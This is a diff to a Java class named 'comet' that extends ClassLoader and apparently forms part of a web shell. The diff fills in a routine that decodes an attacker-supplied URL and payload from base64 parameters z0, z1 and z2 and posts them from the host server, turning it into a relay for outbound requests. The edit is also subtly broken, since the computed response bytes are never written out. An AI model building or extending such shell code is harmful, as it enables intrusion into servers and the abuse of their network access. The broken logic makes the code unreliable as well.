@@ -183,16 +183,30 @@ public class comet extends ClassLoader
             StringBuilder sb = new StringBuilder();
             
             String szURL = new String(Base64.getDecoder().decode(mapParams.get("z0")), StandardCharsets.UTF_8);
-            boolean bIsBinary = new String(Base64.getDecoder().decode(mapParams.get("z")), StandardCharsets.UTF_8).equalsIgnoreCase("binary");
-            byte[] decodedData = Base64.getDecoder().decode(mapParams.get("z2")); 
+            
+            byte[] decodedData = Base64.getDecoder().decode(mapParams.get("z1")); 
+            boolean bIsBinary = new String(Base64.getDecoder().decode(mapParams.get("z2")), StandardCharsets.UTF_8).equalsIgnoreCase("binary");
 
+            byte[] responseBytes;
             if (bIsBinary)
             {
-
+                responseBytes = http_post(szURL, decodedData);
             }
             else
             {
-                
+                String szTextPayload = new String(decodedData, StandardCharsets.UTF_8);
+                responseBytes = http_post(szURL, szTextPayload);
+            }
+
+            byte[] finalOutputBytes;
+            if (bIsBinary)
+            {
+                String base64Result = Base64.getEncoder().encodeToString(responseBytes);
+                finalOutputBytes = base64Result.getBytes(StandardCharsets.UTF_8);
+            }
+            else
+            {
+                finalOutputBytes = responseBytes;
             }
 
             fnWriteOutput(objParam, objResponse, osClient, sb.toString().getBytes());
